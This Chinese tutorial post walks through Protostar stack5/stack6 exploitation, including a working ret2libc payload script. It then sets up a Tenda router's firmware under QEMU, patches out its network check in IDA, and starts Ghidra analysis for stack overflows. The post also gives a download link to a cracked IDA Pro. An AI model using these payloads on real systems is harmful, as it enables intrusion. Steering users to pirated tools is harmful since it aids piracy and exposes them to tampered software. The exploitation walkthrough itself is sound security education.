![](https://img-blog.csdnimg.cn/e72e559cbcef42639fe2807ca851722b.png#id=YhHkb&originHeight=666&originWidth=824&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
这是一个linux x86架构执行/bin/sh的shellcode

如果我们直接运行脚本是得不到/bin/sh的
![](https://img-blog.csdnimg.cn/18b8e93ed85740ce94630c4c64a53877.png#id=VbVFf&originHeight=73&originWidth=580&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
其实/bin/sh已经执行了，只是没有输入，我们可以用cat命令来重定向到标准输入输出
![](https://img-blog.csdnimg.cn/f7df9bf7c886465f8c1b32a6dc4fa155.png#id=JxjCn&originHeight=147&originWidth=436&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
```
 (python stack5exp.py ; cat) | /opt/protostar/bin/stack5
```
![](https://img-blog.csdnimg.cn/55370e694ef146e9be331d801e6ddad6.png#id=SrSJk&originHeight=106&originWidth=686&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
## ret to libc
"Ret to libc"（返回到 libc）是一种利用软件漏洞，尤其是缓冲区溢出漏洞，来绕过某些安全防护机制（如非执行位 NX 或数据执行防止 DEP）的攻击技术。这种攻击方法不直接注入并执行恶意代码，而是利用程序本身或者其运行时环境（如 C 标准库 libc）中已有的代码来执行攻击者想要的操作。由于这些库函数的代码在正常情况下是可执行的，攻击者可以绕过那些防止代码注入的安全措施
### 程序静态分析
![](https://img-blog.csdnimg.cn/a3172c0ebf064b309f36cfe6e9f01570.png#id=xglil&originHeight=1669&originWidth=2913&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()   //定义一个名为getpath的函数
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);  //输出字符串input path please: 

  gets(buffer);  //获取用户输入，将输入存储到buffer函数变量里

  ret = __builtin_return_address(0);   //获取ret返回的内存地址

  if((ret & 0xbf000000) == 0xbf000000) {   //如果内存地址的前两位是0xbf
    printf("bzzzt (%p)\n", ret);  //输出bzzzt
    _exit(1);
  }

  printf("got path %s\n", buffer);  //输出got path
}

int main(int argc, char **argv)  //主函数
{
  getpath();  //调用getpath函数
}
```

ret to libc是将程序的返回地址覆盖为标准 C 库中的某个函数的地址，如 "system" 函数，这个函数可以用来执行系统命令。然后，攻击者构造一个有效的参数，比如"/bin/sh"，将其传递给 "system" 函数，从而获取shell
### 寻找system函数地址和/bin/sh字符串
用gdb打开程序，在getpath函数执行leave指令的地址打一个断点
```
disassemble getpath
b *0x080484f8
```
![](https://img-blog.csdnimg.cn/a6f74696555d4968a8293fdbed0808a7.png#id=gGbwq&originHeight=1155&originWidth=1537&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
运行程序后随意输入一些字符串，让后寻找system函数的地址
```
r
p system
```
![](https://img-blog.csdnimg.cn/156f19fbf7ea440e8fd5c347ead5dd4a.png#id=wClMF&originHeight=343&originWidth=1325&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
system函数地址为：0xb7ecffb0，找到了system函数地址，现在我们就要找让system函数执行命令的字符串，为了获取shell，我们寻找"/bin/sh"字符串
### 什么是内存映射？
内存映射是一种操作系统和计算机体系结构中常见的技术，用于将文件或其他设备的内容映射到进程的地址空间，使得进程可以像访问内存一样访问这些内容
### 什么是libc库？
在编译程序时，我们要调用函数，为了缩小程序大小，我们通常会动态编译文件，程序调用函数时，就会到指定的libc库里查找并执行
执行i proc mappings查看程序内存映射
![](https://img-blog.csdnimg.cn/4cfa2eda599a4f1fa019a36a8292735b.png#id=L9WLx&originHeight=673&originWidth=1651&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
stack6的libc库为：/lib/libc-2.11.2.so，libc的基地址为：0xb7e97000
现在新开一个终端，在libc库里查找/bin/sh字符串的地址
```
strings -t d /lib/libc-2.11.2.so | grep "/bin/sh"
```
![](https://img-blog.csdnimg.cn/326de866cca2430b89746200429149b5.png#id=Boj5D&originHeight=125&originWidth=1525&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
字符串/bin/sh的偏移地址为：1176511，libc的基地址+字符串的偏移地址=程序调用字符串的完整地址
### 寻找程序溢出大小
查看main函数代码
```
disassemble main
```
![](https://img-blog.csdnimg.cn/24fe8911762a4e808fca5d094b1624f6.png#id=gWmb2&originHeight=355&originWidth=1013&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
程序调用了getpath函数后，会返回0x08048505继续执行下一个指令，重新运行程序，随便输入一些字符，然后查看栈状态
![](https://img-blog.csdnimg.cn/2e42634d349b4ea39f4bfbde7b98e312.png#id=o7tRa&originHeight=1057&originWidth=1413&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
我们输入的字符串离0x08048505有80个字节，在0x08048505上面还有一个0x08048505，那个只是普通的值，在程序返回main函数时，还会调用其他的系统函数，所以下一个才是getpath函数ret main函数的值
现在我们可以写一个脚本来破解程序
```
import struct

buffer = "A"*80   //覆盖到ret地址的函数

system = struct.pack("I",0xb7ecffb0)  //system地址
ret = "AAAA"  //在执行system函数时，会调用一个返回地址，这里随意输入一些字符，下图解释

shellcode = struct.pack("I",0xb7e97000+1176511)  ///bin/sh字符串地址

payload = buffer +system+ ret + shellcode
print payload
```
在执行system函数时，会调用一个返回地址，可以随意输入一些字符，然后就会执行"/bin/sh"字符串
![](https://img-blog.csdnimg.cn/689ad18e83a1474f97801a2b002d1d65.png#id=S5aVc&originHeight=519&originWidth=525&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

执行程序，成功获得root权限
![](https://img-blog.csdnimg.cn/fd8926c293c349049018bbafef6fe2a7.png#id=y2KCY&originHeight=553&originWidth=1635&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
接下来进入主题
# 使用QEMU搭建仿真环境
## 工具下载
在下载工具前，我们需要更新一下本地的源，这个命令的主要作用是同步包管理器的软件源（repositories）列表中所有的包和版本信息，确保你在安装、升级或删除软件包时，软件包信息是最新的
```
apt update
```
### binwalk
binwalk 是一个开源工具，主要用于分析和提取固件以及二进制文件。它广泛应用于逆向工程领域，尤其在安全研究员和爱好者中很受欢迎，因为它可以帮助他们理解设备固件的组成和功能，以及发现潜在的安全漏洞。binwalk 通过识别文件中的魔术数字（magic numbers），可以自动检测嵌入的文件系统、压缩的图片和编码的数据等、
安装binwalk：
```
sudo apt install binwalk
```
官方github项目地址：
```
https://github.com/ReFirmLabs/binwalk
```
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711007381051-b4431c53-c4a8-4fe7-b36a-2fcbb5bc57fe.png#averageHue=%230e1219&clientId=ud8a14ec6-f2c0-4&from=paste&height=923&id=u3c29f0eb&originHeight=1384&originWidth=2557&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=350647&status=done&style=none&taskId=uab10556e-f128-4581-a6bf-3db215d5543&title=&width=1704.6666666666667)
本次我使用的binwalk版本为：
```
Binwalk v2.3.3
```
### QEMU
QEMU是一种流行的开源机器模拟与虚拟化软件。它的全称是Quick Emulator，意即“快速模拟器”。QEMU允许用户模拟完整的计算机系统，包括处理器和各种外设，这样可以在一个主机系统上运行一个或多个客户操作系统。它支持多种硬件架构，这意味着不仅可以模拟您的当前硬件架构，还可以模拟其他架构，以运行为那些架构专门设计的软件
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711007429241-41233661-9edc-4c48-a4ef-346ae585f0ae.png#averageHue=%23b7bbaf&clientId=ud8a14ec6-f2c0-4&from=paste&height=933&id=u5e3cae0b&originHeight=1399&originWidth=2560&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=658491&status=done&style=none&taskId=u87fdadc8-00ef-4ef0-b1de-5294e762041&title=&width=1706.6666666666667)
安装QEMU：
```
sudo apt install qemu-user-static
```
安装完QEMU后，会发现多了很多工具
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711007520351-70805f98-4419-42ff-a003-b3d27115ecbe.png#averageHue=%23050506&clientId=ud8a14ec6-f2c0-4&from=paste&height=763&id=ub3bfaaaf&originHeight=1145&originWidth=1003&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=166790&status=done&style=none&taskId=u72a1ce83-4c80-492f-8f9e-6ed807e11a2&title=&width=668.6666666666666)
这些工具名称的意义是：qemu-模拟的系统-静态链接，这里以qemu-aarch64-static名称举例
```
QEMU：是一个开源的硬件虚拟化项目，提供了一套完整的虚拟化解决方案，允许你在一个架构上模拟运行另一个架构的程序。它支持多种处理器架构，包括 x86、x86_64（AMD64/Intel 64）、MIPS、ARM、PowerPC、SPARC 等
aarch64：指的是 ARMv8 架构的 64 位模式，也就是现代 ARM 处理器的 64 位架构（如在许多智能手机、平板电脑和一些服务器中使用的处理器）。aarch64 是 ARM 64 位指令集的一种通称，用于区分早期的 32 位 ARM 指令集（ARMv7 及之前，通常称为 armhf 或 armel）
static：意味着这个 QEMU 的可执行文件是静态链接的。静态链接的二进制文件包含了运行程序所需的所有库的副本，这意味着它不依赖于系统上的共享库。这种方式使得该可执行文件可以在没有安装必要库的系统上运行，增强了其在不同环境中的可移植性和使用的灵活性
```
目标固件是在什么系统上运行的，也要用相应版本的qemu工具运行
### Ghidra
Ghidra是一个由美国国家安全局（NSA）开发并公开发布的软件逆向工程（SRE）工具套件。它是一个完全开源的项目，旨在提供一个全面的工具集合，用于执行对编译代码（如二进制文件和执行文件）的逆向工程任务
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711012228182-a6050d73-8e65-44d6-b7a9-0f05adca4f8f.png#averageHue=%232c1714&clientId=ud8a14ec6-f2c0-4&from=paste&height=792&id=ua37a5723&originHeight=1188&originWidth=2535&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=333099&status=done&style=none&taskId=u91aa62b6-0407-40e9-b457-b358a2b7d81&title=&width=1690)
官方github项目地址：
```
https://github.com/NationalSecurityAgency/ghidra
```
解压后进入文件夹，ghidraRun就是要运行的文件，想要运行它，还需要一个指定的java版本
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711012346866-673ea913-7814-4d87-9eee-d957088044b1.png#averageHue=%2307070a&clientId=ud8a14ec6-f2c0-4&from=paste&height=128&id=u75bc0806&originHeight=192&originWidth=1465&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=43962&status=done&style=none&taskId=u4f2a2364-5934-492e-8995-4ca5e968b28&title=&width=976.6666666666666)
安装JDK17 java环境：
```
apt install openjdk-17-jdk
```
安装后就能正常运行ghidra了
```
./ghidraRun
```
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711012492098-a6e88e3b-36c5-42f2-b966-2b2fe9fa61d2.png#averageHue=%23dce6de&clientId=ud8a14ec6-f2c0-4&from=paste&height=397&id=ua8789050&originHeight=596&originWidth=791&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=39743&status=done&style=none&taskId=ub93eb318-1756-4115-b3d2-7af2a533217&title=&width=527.3333333333334)
### IDA PRO
IDA Pro（Interactive DisAssembler Professional）是一款高级的、交互式的逆向工程工具，由Hex-Rays SA开发。它主要用于软件逆向工程，尤其在分析恶意代码、发现漏洞、理解闭源软件的工作原理方面非常有用
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711014819651-1ac56590-5588-4b9a-ad6b-eec103d12c0a.png#averageHue=%2338979b&clientId=ud8a14ec6-f2c0-4&from=paste&height=883&id=u9926612f&originHeight=1324&originWidth=2537&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=2234818&status=done&style=none&taskId=ud00033fe-816a-4b10-b150-29583c2e17f&title=&width=1691.3333333333333)
IDA的PRO版要收费，这里给一个第三方破解版下载链接：
```
链接：https://pan.baidu.com/s/105K0592QUsqtWSO1tweSTQ 
提取码：afxj 
```
下载完解压后，进入文件夹后两个应用程序，一个是ida.exe，一个是ida64.exe，32位程序要用ida.exe分析，64位程序用ida64.exe分析
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711015192886-abdc5bf9-3300-499e-9858-1284ebf23b57.png#averageHue=%23221e1d&clientId=ud8a14ec6-f2c0-4&from=paste&height=635&id=u3bc20349&originHeight=953&originWidth=1691&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=183145&status=done&style=none&taskId=uea9891d3-5e9f-4e4f-a879-33882be8267&title=&width=1127.3333333333333)
## 路由器网络检测环境破解与搭建
用QEMU运行路由器的固件可能会遇到无法识别网络的问题，本次演示的路由器固件就有这个问题，下面会详细展开说说这种情况的应对方法
### 提取固件里的文件
下载完固件后，解压压缩包
```
unzip V16.03.34.09.zip
```
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711009131054-04215aab-ca72-4d37-b4dd-336876b2d4f1.png#averageHue=%230b0b0c&clientId=ud8a14ec6-f2c0-4&from=paste&height=107&id=u7e5090bf&originHeight=160&originWidth=873&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=26256&status=done&style=none&taskId=uf74a1ce6-1700-4f72-aade-0925342ac58&title=&width=582)
解压后进入文件夹，有两个文件
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711009308577-8740298c-cced-47b8-8aaf-d8aad59af7e2.png#averageHue=%2309090b&clientId=ud8a14ec6-f2c0-4&from=paste&height=197&id=u7a11ee7e&originHeight=295&originWidth=963&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=43870&status=done&style=none&taskId=u5e25fdaf-bc5e-4b4a-bd21-6a9d9f78f10&title=&width=642)
一个是升级说明的docx文件，另一个就是路由器的固件
使用binwalk工具提取文件，需要注意的是Binwalk v2.3.3 及更高版本使用root用户执行，需要添加--run-as=root参数，否则 Binwalk v2.3.3 及更高版本将拒绝以 root 身份执行提取
```
binwalk -eM US_AC8V4.0si_V16.03.34.09_cn_TDC01.bin --run-as=root
```
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711009773771-1e2d288b-b492-44f4-81b3-04ddc2897207.png#averageHue=%2309090a&clientId=ud8a14ec6-f2c0-4&from=paste&height=669&id=ub33fada4&originHeight=1003&originWidth=1926&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=245958&status=done&style=none&taskId=u56436f38-65d8-41fc-b88c-034885166a5&title=&width=1284)
在提取完成后，binwalk会在当前文件夹下生成一个文件夹，这个文件夹里存放的就是binwalk从固件里提取出来的文件
进入文件夹后，可以看到四个文件，路由器关键的文件环境在squashfs-root里
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711010148529-639cb3a6-434e-4357-bf1b-a8e110df3d10.png#averageHue=%230d0d0f&clientId=ud8a14ec6-f2c0-4&from=paste&height=135&id=ubc6e3db4&originHeight=202&originWidth=1309&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=41213&status=done&style=none&taskId=u2fb640b3-faad-4531-8287-cf9b9a8e68c&title=&width=872.6666666666666)
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711010296627-3e27b882-1e56-49c2-b802-d625bd0c618c.png#averageHue=%230b0b0e&clientId=ud8a14ec6-f2c0-4&from=paste&height=141&id=u2accaa95&originHeight=212&originWidth=1759&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=46927&status=done&style=none&taskId=u62fa25d0-c787-4e58-9d87-468406e76e8&title=&width=1172.6666666666667)
这些文件名和linux机器上的根目录文件名很多都相同，那是因为路由器也是一个微型的计算机，在上面也运行着linux系统
运行路由器网站和用户交互的固件在bin目录下，叫做httpd，我们之后的分析也是分析这个文件
### 固件文件详细信息查看
用file工具可以查看文件的详细信息
```
file bin/httpd
```
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711011109537-d1b5a6b6-135a-4441-a91d-55a611cbaf36.png#averageHue=%230d0d0e&clientId=ud8a14ec6-f2c0-4&from=paste&height=82&id=u5d46311b&originHeight=123&originWidth=1724&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=29663&status=done&style=none&taskId=u4a415f32-be48-4567-ac5d-9f77347863e&title=&width=1149.3333333333333)
```
bin/httpd: ELF 32-bit LSB executable, MIPS, MIPS-I version 1 (SYSV), dynamically linked, interpreter /lib/ld-musl-mipsel.so.1, stripped
```
通过文件的详细信息，我们可以知道：
```
ELF 32-bit LSB executable: 这表示 httpd 文件是一个 32位 的 ELF（Executable and Linkable Format）格式的可执行文件
MIPS, MIPS-I version 1 (SYSV): 这表明该可执行文件是为 MIPS 架构编译的，具体是 MIPS-I 指令集的第一个版本
dynamically linked: 这意味着 httpd 是一个动态链接的可执行文件，它在运行时会加载外部共享库
interpreter /lib/ld-musl-mipsel.so.1: 这一部分指定了动态链接器（或叫作动态加载器）的路径
stripped: 这表示从 httpd 文件中已经移除了调试信息，使得文件更小、加载更快
```
### 网络检测环境破解与搭建
通过查看文件的详细信息，我们知道了这个程序是MIPS架构的，我们用QEMU搭建仿真环境时，就要使用这个工具qemu-mipsel-static
```
qemu-mipsel-static -L . ./bin/httpd
-L .: 这个选项告诉 QEMU 在指定的目录（在这个例子中是当前目录，表示为 .）中寻找系统库和其他必要的文件
```
在运行程序时会发现它一直卡在Welcome to字符串处
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711012058222-d0d31b06-fc2a-4185-982d-264c7b096534.png#averageHue=%2308080a&clientId=ud8a14ec6-f2c0-4&from=paste&height=196&id=u51bd378a&originHeight=294&originWidth=1266&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=33757&status=done&style=none&taskId=u301c6ce8-2e88-44eb-8345-1969472d44a&title=&width=844)
将httpd程序导出虚拟机，通过上面查看文件的详细信息，这是一个32为的文件，进入ida pro文件夹，将httpd程序拖入ida.exe
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711015775568-42ab4145-bfe8-4f77-b6ac-830c69347416.png#averageHue=%239e5b48&clientId=ud8a14ec6-f2c0-4&from=paste&height=697&id=u81767262&originHeight=1045&originWidth=1958&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=1117246&status=done&style=none&taskId=u3702669b-b9fe-4492-bd82-1f97766efec&title=&width=1305.3333333333333)
点击ok
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711015825864-4073970e-5e01-4e8b-9934-cf3ec3f6c8b5.png#averageHue=%235d5d5c&clientId=ud8a14ec6-f2c0-4&from=paste&height=635&id=ue4333c63&originHeight=953&originWidth=1691&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=199718&status=done&style=none&taskId=ua16c4d3d-27ca-4274-835d-3319092c079&title=&width=1127.3333333333333)
进入ida后就一直点击ok
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711015871707-80f159fb-afd2-4e08-b741-94215f5547ff.png#averageHue=%23f7f6f6&clientId=ud8a14ec6-f2c0-4&from=paste&height=1020&id=ua41479f7&originHeight=1530&originWidth=2560&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=436343&status=done&style=none&taskId=u54967ff8-c51c-4828-b08f-48a655e5dfc&title=&width=1706.6666666666667)
按shift+f12可以查找程序内所有的字符串
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711015957669-d60b66f6-7e9d-43bd-be8d-c292a1b4f5ff.png#averageHue=%23f8f7f6&clientId=ud8a14ec6-f2c0-4&from=paste&height=1020&id=u681ebcb6&originHeight=1530&originWidth=2560&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=453508&status=done&style=none&taskId=uf7a480b0-0c66-4d74-8101-3dfbc14de05&title=&width=1706.6666666666667)
再按ctrl+f 定位welcone to字符串位置
![](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711016012731-80f5ebc2-8f6b-4e13-9404-5b994c4fe30b.png#averageHue=%23fafaf9&clientId=ud8a14ec6-f2c0-4&from=paste&id=u53cf8948&originHeight=1396&originWidth=1757&originalType=url&ratio=1.5&rotation=0&showTitle=false&status=done&style=none&taskId=u0f4217b3-65db-475a-b1a6-be5c05e0ad8&title=)
双击，进入rodata段，交叉定位跳转到调用这个字符串的地址
![](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711016026418-eb4cbd3f-1bff-4f34-ae00-0220e6ee9441.png#averageHue=%23f9f9f8&clientId=ud8a14ec6-f2c0-4&from=paste&id=ufdfa0901&originHeight=596&originWidth=1388&originalType=url&ratio=1.5&rotation=0&showTitle=false&status=done&style=none&taskId=udff4846e-470d-4db3-b7ed-2a3c74861f1&title=)
![](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711016032546-04f066c7-8d4a-4c06-881e-6e2af854a123.png#averageHue=%2372b465&clientId=ud8a14ec6-f2c0-4&from=paste&id=uc2102841&originHeight=1317&originWidth=1933&originalType=url&ratio=1.5&rotation=0&showTitle=false&status=done&style=none&taskId=u36c7da25-447c-43b9-b76c-35e4a774bee&title=)
程序在这里进入了死循环，代码的最后部分包含了一个条件跳转指令bnez（如果不等于零则跳转），这个跳转指令依赖于GetValue函数的返回值。如果GetValue返回非零值，程序将跳转到loc_43B828，在loc_43B828最后，又会跳回loc_43872c处，和while函数类似
![](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711016053466-0b54c266-0f72-47ae-a67b-3f2c818e27fe.png#averageHue=%23249228&clientId=ud8a14ec6-f2c0-4&from=paste&id=ubca9ee3d&originHeight=968&originWidth=1628&originalType=url&ratio=1.5&rotation=0&showTitle=false&status=done&style=none&taskId=u29cf4abc-6993-4767-abf0-ca3ad34ef44&title=)
#### 什么是NOP指令？
NOP指令，全称"No Operation"指令，是一种在多种编程语言和汇编语言中存在的特殊指令。如其名所示，NOP指令的执行不会对程序的状态或机器的执行环境产生任何影响，也就是说，它不执行任何操作。在CPU执行NOP指令时，除了指令计数器（PC）会前进到下一条指令外，其他的寄存器值、内存状态和处理器的状态都不会改变

也就是说，我们可以用nop指令把while函数给覆盖掉，使程序不执行while函数
回到ida pro，我们可以把这两个跳转的地方用nop指令给覆盖掉
![](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711016189294-b238f944-3278-43e0-a81c-2d4a08d07cd0.png#averageHue=%235faf5f&clientId=ud8a14ec6-f2c0-4&from=paste&id=u95865350&originHeight=1014&originWidth=1393&originalType=url&ratio=1.5&rotation=0&showTitle=false&status=done&style=none&taskId=u0ee1bf8d-ba38-4b3f-b346-d7ec0f2c55c&title=)
把鼠标放到第一个红框的地址处，点击一下，然后在ida pro上面的任务栏里选择
```
Edit->Patch program->change byte
```
将前4位都改成0，点击ok，就能换成nop指令了
![](https://img-blog.csdnimg.cn/img_convert/5955abedd131b3d077e0f2b3332e02b8.png#id=uZzBM&originHeight=723&originWidth=1242&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
![](https://img-blog.csdnimg.cn/img_convert/79c1c3cefaa0875042735d6401899761.png#id=ytWPA&originHeight=894&originWidth=1035&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
继续更改第二个跳转指令，点击跳转地址的地方，然后在ida pro上面的任务栏里选择
```
Edit->Patch program->change byte
```
继续将前四个值改成0
![](https://img-blog.csdnimg.cn/img_convert/d35ff496b719742800d008cc824517e5.png#id=UR0Kz&originHeight=949&originWidth=1384&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
![](https://img-blog.csdnimg.cn/img_convert/93e796c319772f0f731202f1f2b5f4ac.png#id=jW4no&originHeight=801&originWidth=1194&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
点击ok，完成程序修改
![](https://img-blog.csdnimg.cn/img_convert/e7314173f3018499d99a62565d031a9a.png#id=dpBuP&originHeight=1168&originWidth=1609&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
现在导出程序，还是在ida pro上面的任务栏里选择
```
Edit->Patch program->Apply patches to input file
```
![](https://img-blog.csdnimg.cn/img_convert/1a29b028f508a8f8b9a083799ab9d036.png#id=Ln0ut&originHeight=699&originWidth=1146&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
点击ok，现在程序已经被我们修改了，退出ida pro，将修改后的文件覆盖虚拟机里的源文件，然后给程序赋权
```
chmod 777 httpd
```
最后添加新的网卡，运行程序
```
brctl addbr br0
brctl addif br0 eth0
ifconfig br0 up
dhclient br0
```
![](https://img-blog.csdnimg.cn/img_convert/af9de66922b6aacc3177c13de61754bf.png#id=sRJSq&originHeight=684&originWidth=996&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
```
qemu-mipsel-static -L . ./bin/httpd
```
![](https://img-blog.csdnimg.cn/img_convert/bcf6b2b03bb1daceaa8c2bcea22ab0d2.png#id=gV2AJ&originHeight=849&originWidth=1302&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
![](https://img-blog.csdnimg.cn/img_convert/dae0a9eec3fcda75f3c961fe5aab2ffb.png#id=wJYQE&originHeight=1168&originWidth=1585&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
成功在虚拟机里访问路由器
# 静态分析挖掘漏洞
## 什么是缓冲区溢出？
在程序运行时，系统会为程序在内存里生成一个固定空间，如果超过了这个空间，就会造成缓冲区溢出，可以导致程序运行失败、系统宕机、重新启动等后果。更为严重的是，甚至可以取得系统特权，进而进行各种非法操作。
![](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711016611372-1efb3c49-15ba-4f93-a917-f29fcb007163.png#averageHue=%23f3f3f3&clientId=ud8a14ec6-f2c0-4&from=paste&id=u9e85698d&originHeight=403&originWidth=768&originalType=url&ratio=1.5&rotation=0&showTitle=false&status=done&style=none&taskId=u19300147-093e-4388-9661-ccc0179214a&title=)
## 栈溢出漏洞挖掘
进入ghidra文件夹，运行ghidra来静态分析程序
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711013580552-d415a717-50c6-4249-b5ef-eca695b1200e.png#averageHue=%23393b3e&clientId=ud8a14ec6-f2c0-4&from=paste&height=583&id=ufff39173&originHeight=874&originWidth=1521&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=127449&status=done&style=none&taskId=u5221bb09-188a-4a7d-a94e-2431e5a72c6&title=&width=1014)
如果是第一次运行程序，那么需要先创建一个项目，已经创建过的可以跳过这一步
点击file，然后选择New Project
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711013822631-715b4c09-e30b-4752-a665-4de67d7f4439.png#averageHue=%2385a0b3&clientId=ud8a14ec6-f2c0-4&from=paste&height=400&id=ua2bf9c51&originHeight=600&originWidth=803&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=48249&status=done&style=none&taskId=ub50270ad-7f7f-40c2-ba16-0d9c1a44fb3&title=&width=535.3333333333334)
点击next
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711013855442-db603db9-0601-4e0e-924c-723b88dd5a7b.png#averageHue=%23b9bcc2&clientId=ud8a14ec6-f2c0-4&from=paste&height=403&id=uad065b7d&originHeight=604&originWidth=801&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=59630&status=done&style=none&taskId=u4170753a-8729-4e0f-8695-775825c816c&title=&width=534)
选择要存放的路径和文件名，这里随便填即可
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711013892215-691cefb8-6a0d-43b4-a286-e967ddae5b8b.png#averageHue=%23b8bbc2&clientId=ud8a14ec6-f2c0-4&from=paste&height=398&id=ubd3756a6&originHeight=597&originWidth=799&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=59859&status=done&style=none&taskId=uf54dcad0-fe6f-405d-8099-1f5cc959be8&title=&width=532.6666666666666)
点击Finsh创建好项目后，我们就可以导入程序了
还是点击file，选择Import File
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711013932388-826edfca-c04e-4c7c-b2f8-ba8225580c2d.png#averageHue=%2390a8b9&clientId=ud8a14ec6-f2c0-4&from=paste&height=404&id=u2c6993b1&originHeight=606&originWidth=801&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=48036&status=done&style=none&taskId=u9b0077c7-9cd9-4f66-b3e2-9b2cf0a8876&title=&width=534)
在bin目录下找到httpd文件，点击导入
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711014048490-677bf37f-cf0d-4129-b9dd-b2677df93f64.png#averageHue=%23c5d367&clientId=ud8a14ec6-f2c0-4&from=paste&height=403&id=u337e9cee&originHeight=604&originWidth=821&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=83712&status=done&style=none&taskId=udfaf557b-8611-420d-ac7d-0122b249c50&title=&width=547.3333333333334)
点两次OK后，可以看到文件已经被导入了
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711014083143-f76c4d97-503a-458c-af60-aaed68a792ce.png#averageHue=%23b9bdc4&clientId=ud8a14ec6-f2c0-4&from=paste&height=399&id=u65319009&originHeight=598&originWidth=796&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=69744&status=done&style=none&taskId=uceb21260-fe64-4c1b-87d6-be31f0cf75d&title=&width=530.6666666666666)
双击httpd程序，进入分析
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711014104619-65ab0e84-5397-44ae-a5d4-a8bac478d99d.png#averageHue=%23dde7e0&clientId=ud8a14ec6-f2c0-4&from=paste&height=401&id=u4884f7bc&originHeight=601&originWidth=790&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=40780&status=done&style=none&taskId=u1cbc0673-6ded-4e5d-ab5a-2da2c45738e&title=&width=526.6666666666666)
选择yes
